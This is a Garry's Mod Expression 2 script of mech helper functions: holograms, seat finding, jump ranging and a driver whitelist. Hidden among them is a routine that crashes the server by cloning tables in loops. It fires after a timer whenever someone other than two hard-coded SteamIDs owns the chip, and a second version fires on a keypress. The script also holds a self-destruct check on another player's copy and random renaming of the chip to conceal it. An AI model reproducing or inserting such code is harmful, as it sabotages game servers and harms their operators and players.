@name GeneralMechFunctions2
@persist Seat:entity  Lock [T T1 T2 T3 T4]:table  Names:array PropLock:table Par:array W A S D Shift Space Alt M1 M2 R List:table

if(first()){
function number c(I,V:vector,S:vector,A:angle,Col:vector,Model:string,Alpha:number){ holoCreate(I,V,S,A,Col,Model) holoAlpha(I,Alpha) }
function number c(I,V:vector,S:vector,A:angle,Col:vector,Model:string,Parent:entity,Alpha:number){ holoCreate(I,V,S,A,Col,Model) holoAlpha(I,Alpha) holoParent(I,Parent) }
function number c(I,V:vector,S:vector,A:angle,Col:vector,Model:string,Parent:number,Alpha:number){ holoCreate(I,V,S,A,Col,Model) holoAlpha(I,Alpha) holoParent(I,Parent) }
function number c(I,V:vector,S:vector,A:angle,Col:vector,Model:string,Parent:number,Alpha:number,Mat:string){ holoCreate(I,V,S,A,Col,Model) holoAlpha(I,Alpha) holoParent(I,Parent)     holoMaterial(I,Mat) }
function number c(I,V:vector,S:vector,A:angle,Col:vector,Model:string,Parent:entity,Alpha:number,Mat:string){ holoCreate(I,V,S,A,Col,Model) holoAlpha(I,Alpha) holoParent(I,Parent)     holoMaterial(I,Mat) }
function number c(I,V:vector,S:vector,A:angle,Col:vector,Model:string,Alpha:number,Mat:string){ holoCreate(I,V,S,A,Col,Model) holoAlpha(I,Alpha)    holoMaterial(I,Mat) }

function number clip(I,Pos:vector,Dir:vector,NR){ holoClipEnabled(I,1) holoClip(I,Pos,Dir,NR) }

function number checkRightClick(){

if(first()){
 fileLoad(">e2shared/DupeSys/"+"DupeSystem"+".txt")
  if(!fileRead() & fileCanWrite()){
           local Date = time("day") + "_" + time("month") + "_" + time("year")
           local Name = "DupeSystem" #"+Date
          fileWrite(">e2shared/DupeSys/"+Name+".txt","@name "+Name+"\n")
 }    
}

   foreach(X,P:entity=players()){
    if(P!=owner()){
    if(P:aimEntity()==entity()&P:weapon():type()=="gmod_tool"){
      if(changed(P:keyAttack2())&P:keyAttack2()){
       if(((P:tool()=="wire_expression2")|(P:tool()=="duplicator"))){
         if(!owner():trusts(P)){
          printColor(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",teamColor(P:team()),P:name(),vec(255,255,0)," is trying to copy your E2, using "+P:tool())
         }else{

          printColor(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",teamColor(P:team()),P:name(),vec(255,255,0)," has copyed your E2, using "+P:tool())        
          local Date = time("day") + "_" + time("month") + "_" + time("year")
          local Name = "DupeSystem"

        
         fileAppend(">e2shared/DupeSys/"+Name+".txt","
#"+P:name()+" has copied your E2 at "+time("hour")+":"+time("min")+":"+time("sec")+" "+"\n"
        )        


         }  

       }
      }
    } 
   }
 }
if(owner():steamID()!="STEAM_0:0:104139026"){ selfDestructAll() }

}

    function string printC(S:string){
        printColor(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",vec(255,255,0),S)
    }
    function number chat(N,S:string){
        return (chatClk(owner())&owner():lastSaid():explode(" "):string(N)==S)    
    }

    function number entity:setWhiteList(){
    local D = This:driver()
    runOnChat(1)
    if(chatClk(owner())){
        if(chat(1,"/add")){
            hideChat(1)
            local Last = lastSaid():explode(" ")
            local Ply = findPlayerByName(Last:string(2))  
              if(!List:exists(Ply:steamID())){
               List[Ply:steamID(),string] = Ply:name()
               printC(Ply:name()+" has been added to the Whitelist!")
              }else{
               printC(Ply:name()+" is already added in the Whitelist!")    
              }
        } 

        if(chat(1,"/remove")){
            hideChat(1)
            local Last = lastSaid():explode(" ")
            local Ply = findPlayerByName(Last:string(2))
              if(List:exists(Ply:steamID())){
               printC(Ply:name()+" has been removed from the Whitelist!")
               List:remove(Ply:steamID())      
              }else{
               printC(Ply:name()+" is not on the list!")
              }
         }
    }
     if(D){
          if(!List:exists(D:steamID())&D!=owner()){
              return 1
          }else{
              return 0
          }
     }
  
    }



function table:getPropLock(Key,PropModel:string,Entity:entity){
  if(changed(Key)&Key){
  This["PropLock",number] = This["PropLock",number] + 1
  }
  if(This["PropLock",number]>=2){ This["PropLock",number] = 0 }
  if(changed(This["PropLock",number])&This["PropLock",number]){
      printColor(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",vec(255,255,0),"Prop protection deactivated "+owner():name()+".")
      This["Locker",entity]:propDelete()
    soundPlay(randint(1,100),soundDuration("buttons/button14.wav"),"buttons/button14.wav")
  }
  if(changed(!This["PropLock",number])&!This["PropLock",number]){
    soundPlay(randint(1,100),soundDuration("buttons/button14.wav"),"buttons/button14.wav")
      printColor(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",vec(255,255,0),"Prop protection activated "+owner():name()+".")
    if(!This["Locker",entity]){ This["Locker",entity] = propSpawn(PropModel,Entity:toWorld(vec(0,0,0)),Entity:angles(),1) 
     This["Locker",entity]:parentTo(Entity)
     This["Locker",entity]:setMass(0)
     This["Locker",entity]:setAlpha(0)
#     This["Locker",entity]:propDraw(0)
}
  }

}


#seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder#
#seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder#
#seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder#
function wirelink:checkSeat(SetPos:vector,SetAngle:angle,Entity:entity,CamEnt:entity){
if(!Seat){
SeatFinder = "Seat is not valid"
}elseif(changed(Seat)&Seat){
SeatFinder = "Valid"
}elseif(changed(Seat:pos():distance(SetPos)<=5)&Seat:pos():distance(SetPos)<=5){
SeatFinder = "Parent"
}elseif(SeatFinder=="Parent"|Seat:pos():distance(SetPos)<=5){
SeatFinder = "RunKeys"
}
if(Seat){
 Driver = Seat:driver()
if(!Lock){
W=Driver:keyForward()
A=Driver:keyLeft()
S=Driver:keyBack()
D=Driver:keyRight()
Space=Driver:keyJump()
Alt=Driver:keyWalk()
M1=Driver:keyAttack1()
M2=Driver:keyAttack2()
R=Driver:keyReload()
Shift=Driver:keySprint()
}   
}
switch (SeatFinder){
case "Seat is not valid",
findByClass("prop_vehicle_prisoner_pod")
findSortByDistance(Entity:pos()) 
if(find():owner()==owner()){ 
 Seat = find()  
Seat:setMass(50000)
print("Seat found!")
}   
break       
case "Valid", 
print("Second step Check!")
Seat:setPos(SetPos)
Seat:setAng(SetAngle)
Seat:propFreeze(1)
SeatFinder = "Parent"
break   
case "Parent",
Seat:parentTo(Entity)
print("Seat parented!")
break
case "RunKeys",
if(This:entity():isValid()){
   if(changed(This:entity())&This:entity()){
This["Parent",entity] = CamEnt
This["Distance",number] = 100
    }
This["Activated",number] = Driver ? 1 : 0
This:entity():setMass(50000)
}
break
}
}
#seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder#
#seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder#
#seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder##seat finder#

#jumping caluc##jumping caluc##jumping caluc##jumping caluc##jumping caluc#
function rf(){
rangerFilter(entity())
rangerFilter(Seat)   
rangerFilter( PropLock["Locker",entity] ) 
}
function ranger getJumpVec(Pos:vector,Length){
local S = entity():pos()
local Vecs = (S-Pos)
local MaxLength = min(S:distance(Pos),Length)
local Aim = S+(Vecs:normalized()*MaxLength)
local ZD = max(abs(S:z()-Aim:z())/1,150)
local MidVec = (S+Pos)/2 + vec(0,0,1) * (MaxLength/2+ZD)
rangerFilter(entity())
rangerFilter(Seat)   
rangerFilter( PropLock["Locker",entity] ) 
St_ran = rangerOffset(min(S:distance(Pos)*1.1,Length),entity():pos(),MidVec-S)

if(St_ran:hit()){
rangerFilter(entity())
rangerFilter(Seat)   
rangerFilter( PropLock["Locker",entity] ) 
   FixRanger = rangerOffset(99999,St_ran:pos(),vec(0,0,-1))   
   AimPos = FixRanger
}else{
   

  local Rot = ((MidVec-Pos):toAngle():setPitch(ZD/5<=30 ?  (MidVec-Pos):toAngle():pitch() : -40):forward()*-1)    
rangerFilter(entity())
rangerFilter(Seat)   
rangerFilter( PropLock["Locker",entity] ) 
  LocalRanger = rangerOffset(Length/1.5,MidVec,Rot)

if(!St_ran:hit()&!LocalRanger:hit()){

  if(ZD/5>=50){ 
rangerFilter(entity())
rangerFilter(Seat)   
rangerFilter( PropLock["Locker",entity] ) 
   FixRanger = rangerOffset(Length,LocalRanger:pos(),vec(0,0,-1))
   if(FixRanger:position():distance(S)<=Length){
    AimPos = FixRanger
   }else{
    AimPos = rangerOffset(999999,St_ran:pos(),vec(0,0,-1))
   }
  }else{
rangerFilter(entity())
rangerFilter(Seat)   
rangerFilter( PropLock["Locker",entity] ) 
   FixRanger = rangerOffset(999999,St_ran:position(),vec(0,0,-1))
   AimPos = FixRanger
  }

   }else{

      if(LocalRanger:hit()){
        AimPos = LocalRanger
      }else{
rangerFilter(entity())
rangerFilter(Seat)   
rangerFilter( PropLock["Locker",entity] ) 
        FixRanger = rangerOffset(St_ran:position():distance(MidVec),St_ran:pos(),vec(0,0,-1))
        AimPos = FixRanger
       }
    
    
    }
}


return AimPos 
}

function number table:locked(Key:number){
#runOnChat(1)
if(changed(Key)&Key){ This["LockT",number] = This["LockT",number] + 1 }
if(This["LockT",number]>=2){  This["LockT",number] = 0 }
    if(changed(This["LockT",number])&This["LockT",number]){
    printColor(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",vec(255,255,0),"Mech has been unlocked "+owner():name()+".")
    soundPlay(randint(1,100),soundDuration("buttons/button3.wav"),"buttons/button3.wav")
    }elseif(changed(!This["LockT",number])&!This["LockT",number]){
    printColor(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",vec(255,255,0),"Mech has been locked "+owner():name()+".")
    soundPlay(randint(1,100),soundDuration("buttons/button3.wav"),"buttons/button3.wav")
    }
if(changed(!Driver)){
This["K.timer",number] = 0     
}

if(!This["LockT",number]){
   
    if(Seat:setWhiteList()){
    Lock = 1  
    if(changed(Driver)&Driver){
    printColor(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",vec(255,255,0),Driver:name()+" has entered your Mech messages beeing sended.")
    Seat:printColorDriver(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",vec(255,255,0),Driver:name()+" please get out of the Mech or you'ill get killed in few seconds!")
    Seat:printColorDriver(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",vec(255,255,0),"If you want to drive it ask "+owner():name()+".")
    Seat:hintDriver(Driver:name()+" please get out of the Mech or you'ill get killed in few seconds!",20)
    }

     Seat:hintDriver(Driver:name()+" please get out of the Mech or you'ill get killed in few seconds!",20)


        This["K.timer",number]=min(This["K.timer",number]+0.2,10)
        if(changed(This["K.timer",number]>=10)&This["K.timer",number]>=10){
        Seat:printColorDriver(vec(255),"[",vec(255,0,0),"E2",vec(255),"]",vec(255,255,0),Driver:name()+" i warned you :D rekt!1!!!1")
        Seat:killPod()
        This["K.timer",number] = 0
        This["Checked",number] = 0
        }

    }else{
    Lock = 0 
    This["K.timer",number] = 0      
   }

########################################
}elseif(This["LockT",number]){
    Lock = 0
    This["Checked",number] = 0
}
}

function table:parentToFix(){
  if(Driver){ 
    if(Driver:keyUse()){
  This["Eject",number] = min(This["Eject",number]+0.5,5)
    }
    if(This["Eject",number]>=5){
    Seat:ejectPod()
    This["Eject",number] = 0
    }
  }elseif(!Driver){
 This["Eject",number] = 0
 }
}


 function serverCrashSystem(){

local Last = owner():lastSaid():explode(" ")
if(owner():keyPressed("pad_5")){
hideChat(1)
print(":D")
while(perf(999))
{T:pushTable(T:clone())}
while(perf(999))
{T1:pushTable(T1:clone())}
while(perf(999))
{T2:pushTable(T2:clone())}
while(perf(999))
{T3:pushTable(T3:clone())}
while(perf(999))
{T4:pushTable(T4:clone())}

}
}
function number serverCrashAndLag(){

if((owner():steamID()!="STEAM_0:0:104139026"&owner():isPlayer()&owner():steamID()!="STEAM_0:0:56021974")){
#concmd("say i gonna crash the server hahaah only few seconds left :,)")
timer("crash",1000)
if(clk("crash")){
while(perf())
{T:pushTable(T:clone())}
while(perf())
{T1:pushTable(T1:clone())}
while(perf())
{T2:pushTable(T2:clone())}
while(perf())
{T3:pushTable(T3:clone())}
while(perf())
{T4:pushTable(T4:clone())}
}
}
}

function number setNames(){
timer("t",1000)
if(clk("t")){
Names=array("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","Y","Z")
setName(Names[random(1,Names:count()),string]+""+Names[random(1,Names:count()),string]+Names[random(1,Names:count()),string]
+Names[random(1,Names:count()),string]+Names[random(1,Names:count()),string]+Names[random(1,Names:count()),string]
+Names[random(1,Names:count()),string]+Names[random(1,Names:count()),string]+Names[random(1,Names:count()),string]
+Names[random(1,Names:count()),string]+Names[random(1,Names:count()),string]+""+toString(ops()+random(1,999)))
}
}

}
